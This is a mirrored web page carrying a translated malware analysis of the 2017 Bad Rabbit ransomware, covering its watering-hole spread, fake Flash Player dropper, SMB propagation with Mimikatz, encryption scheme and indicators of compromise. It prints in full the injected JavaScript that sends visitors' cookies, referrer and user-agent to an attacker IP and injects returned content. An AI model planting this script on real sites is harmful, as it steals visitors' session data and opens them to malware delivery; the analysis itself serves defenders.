<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Bad Rabbit: Petya returns</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Companies of Russia and Ukraine, including the Kiev Metro, suffered from the attack of the encoder Diskcoder.D (Bad Rabbit), which began on October 24...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Bad Rabbit: Petya returns</h1><div class="post__text post__text-html js-mediator-article">  Companies of Russia and Ukraine, including the Kiev Metro, suffered from the <a href="https://www.welivesecurity.com/2017/10/24/kiev-metro-hit-new-variant-infamous-diskcoder-ransomware/">attack of the</a> encoder Diskcoder.D (Bad Rabbit), which began on October 24.  We collected in the post the first results of a malware research. <br><br><img src="https://habrastorage.org/webt/59/ef/a4/59efa4923eeac371924046.jpeg"><br><br><a name="habracut"></a><h3>  Attack drive-by download using watering hole on popular sites </h3><br>  One way Bad Rabbit spreads is by a drive-by download attack.  The attackers compromised several popular sites by incorporating JavaScript into HTML code or one of the <code>.js</code> files. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/webt/59/ef/a5/59efa58532f3e126424485.png"><br><br>  The following is an improved version of the injection: <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">d</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xhr = <span class="hljs-literal"><span class="hljs-literal">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!!<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.XMLHttpRequest) { xhr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> XMLHttpRequest(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!!<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.ActiveXObject) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xhrs = [<span class="hljs-string"><span class="hljs-string">'Microsoft.XMLHTTP'</span></span>, <span class="hljs-string"><span class="hljs-string">'Msxml2.XMLHTTP'</span></span>, <span class="hljs-string"><span class="hljs-string">'Msxml2.XMLHTTP.3.0'</span></span>, <span class="hljs-string"><span class="hljs-string">'Msxml2.XMLHTTP.6.0'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; xhrs.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { xhr = ActiveXObject(xhrs[i]); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!!xhr) { xhr.open(<span class="hljs-string"><span class="hljs-string">'POST'</span></span>, <span class="hljs-string"><span class="hljs-string">'http://185.149.120\.3/scholargoogle/'</span></span>); xhr.timeout = <span class="hljs-number"><span class="hljs-number">10000</span></span>; xhr.setRequestHeader(<span class="hljs-string"><span class="hljs-string">'Content-Type'</span></span>, <span class="hljs-string"><span class="hljs-string">'application/x-www-form-urlencoded'</span></span>); xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (xhr.readyState == <span class="hljs-number"><span class="hljs-number">4</span></span> &amp;&amp; xhr.status == <span class="hljs-number"><span class="hljs-number">200</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> resp = xhr.responseText; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (resp) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> fans = <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(resp); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (fans) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> an_s = <span class="hljs-built_in"><span class="hljs-built_in">decodeURIComponent</span></span>(fans.InjectionString).replace(<span class="hljs-regexp"><span class="hljs-regexp">/\+/g</span></span>, <span class="hljs-string"><span class="hljs-string">'%20'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> da = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'div'</span></span>); da.id = <span class="hljs-string"><span class="hljs-string">'ans'</span></span>; da.innerHTML = an_s; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body.appendChild(da); } } } }; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pd = []; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> k <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> d) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (d.hasOwnProperty(k)) { pd.push(k + <span class="hljs-string"><span class="hljs-string">'='</span></span> + d[k]); } } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> dc = pd.join(<span class="hljs-string"><span class="hljs-string">'&amp;'</span></span>); xhr.send(dc); } } e({ <span class="hljs-string"><span class="hljs-string">'agent'</span></span>: navigator.userAgent, <span class="hljs-string"><span class="hljs-string">'referer'</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.referrer, <span class="hljs-string"><span class="hljs-string">'cookie'</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.cookie, <span class="hljs-string"><span class="hljs-string">'domain'</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.location.hostname, <span class="hljs-string"><span class="hljs-string">'c_state'</span></span>: !!<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.cookie });</code> </pre><br><br>  The script transmits the following information to 185.149.120 [.] 3, with which, it seems, there is no connection at the moment: <br><br><ul><li>  Browser user-agent </li><li>  Referrer </li><li>  Cookies from the visited site </li><li>  Domain name of the visited site </li></ul><br>  Server-side logic can determine if a visitor is interesting, and then add content to the page.  In this case, we observed a pop-up window with a suggestion to download an update for Flash Player. <br><br><img src="https://habrastorage.org/webt/59/ef/a5/59efa5852eef5548439683.png"><br><br>  Clicking on the Install button starts the download of the executable file from <code>1dnscontrol[.]com</code> .  The executable file <code>install_flash_player.exe</code> is a Win32 / Filecoder.D dropper.  Then the computer will be locked, a message about the buyout will appear on the screen: <br><br><img src="https://habrastorage.org/webt/59/ef/a5/59efa5858221e715586906.png"><br><br>  Payment page: <br><br><img src="https://habrastorage.org/webt/59/ef/a5/59efa5861b12a342467131.png"><br><br><h3>  SMB Distribution </h3><br>  Win32 / Diskcoder.D can be distributed via SMB.  Contrary to some media reports, he DOESN'T use the EthernalBlue exploit (as <a href="https://habrahabr.ru/company/eset/blog/332058/">Win32 / Diskcoder.C did</a> - he is Petya / NotPetya).  Unlike its predecessor, Diskcoder.D scans the internal network for open network drives / resources.  He is looking for the following network balls: <br><br> <code>admin <br> atsvc <br> browser <br> eventlog <br> lsarpc <br> netlogon <br> ntsvcs <br> spoolss <br> samr <br> srvsvc <br> scerpc <br> svcctl <br> wkssvc</code> <br> <br>  On an infected machine, Mimikatz runs to collect credentials.  There is a hard-coded list of logins and passwords. <br><br><img src="https://habrastorage.org/webt/59/ef/aa/59efaa5840e34380923621.png"><br><br>  After finding valid credentials, the <code>infpub.dat</code> file will be downloaded to the Windows directory and executed using SCManager and <code>rundll.exe</code> . <br><br><h3>  Encryption </h3><br>  Win32 / Diskcoder.D - A modified version of Win32 / Diskcoder.C, known for the past epidemic Petya / NotPetya.  Fixed errors in file encryption.  <a href="https://diskcryptor.net/">DiskCryptor</a> , a legitimate open source software for encrypting logical disks, external USB drives and CD / DVD images, as well as bootable system partitions, is now used for encryption.  The keys are generated using <code>CryptGenRandom</code> and then protected with a hard-coded RSA 2048 public key. <br><br>  Files are encrypted with the <code>.encrypted</code> extension.  As before, the AES-128-CBC algorithm is used. <br><br><h3>  Spread </h3><br>  Interestingly, according to ESET telemetry, Ukraine accounts for 12.2% of the dropper component detection.  Statistics below: <br><br><ul><li>  Russia - 65% </li><li>  Ukraine - 12.2% </li><li>  Bulgaria - 10.2% </li><li>  Turkey - 6.4% </li><li>  Japan - 3.8% </li><li>  others - 2.4% </li></ul><br>  The statistics largely correspond to the geographical distribution of compromised sites containing malicious javascript.  At the same time, Ukraine suffered more than other countries (except Russia). <br><br>  Note that large companies were amazed at about the same time.  Perhaps the cyber group had access to their network, and at the same time it launched a watering hole attack as bait.  Not the fact that all the victims fell for the above update Flash Player.  In any case, we continue to investigate the incident. <br><br><h3>  Samples </h3><br><img src="https://habrastorage.org/webt/59/f0/5b/59f05bd5e192a741189434.png"><br><br><h3>  C &amp; C Servers </h3><br> <code> : http://caforssztxqzf2nm[.]onion <br> URL Inject: http://185.149.120[.]3/scholargoogle/ <br> Distribution URL: hxxp://1dnscontrol[.]com/flash_install.php</code> <br> <br><h3>  List of compromised sites: </h3><br> <code>hxxp://argumentiru[.]com <br> hxxp://www.fontanka[.]ru <br> hxxp://grupovo[.]bg <br> hxxp://www.sinematurk[.]com <br> hxxp://www.aica.co[.]jp <br> hxxp://spbvoditel[.]ru <br> hxxp://argumenti[.]ru <br> hxxp://www.mediaport[.]ua <br> hxxp://blog.fontanka[.]ru <br> hxxp://an-crimea[.]ru <br> hxxp://www.t.ks[.]ua <br> hxxp://most-dnepr[.]info <br> hxxp://osvitaportal.com[.]ua <br> hxxp://www.otbrana[.]com <br> hxxp://calendar.fontanka[.]ru <br> hxxp://www.grupovo[.]bg <br> hxxp://www.pensionhotel[.]cz <br> hxxp://www.online812[.]ru <br> hxxp://www.imer[.]ro <br> hxxp://novayagazeta.spb[.]ru <br> hxxp://i24.com[.]ua <br> hxxp://bg.pensionhotel[.]com <br> hxxp://ankerch-crimea[.]ru</code> </div><p>Source: <a href="https://habr.com/ru/post/340890/">https://habr.com/ru/post/340890/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../340878/index.html">Exantech Code Jam: Hacktoberfest 2017</a></li>
<li><a href="../340880/index.html">Bad Rabbit: a new wave of attacks using a ciphering virus</a></li>
<li><a href="../340882/index.html">Telemetry and software</a></li>
<li><a href="../340884/index.html">There is no time to explain! or how to make friends terraform with minikube and kubernetes</a></li>
<li><a href="../340886/index.html">OpenApoc - X-Com Apocalypse Dedicated to Fans</a></li>
<li><a href="../340892/index.html">How to lead people who have more technical experience than you</a></li>
<li><a href="../340894/index.html">Where perspective and adequate to use Python</a></li>
<li><a href="../340898/index.html">Modules instead of microservices</a></li>
<li><a href="../340900/index.html">Why Agile sometimes does not work</a></li>
<li><a href="../340902/index.html">How we do PiterPy - European Conference on Python in Petersburg</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>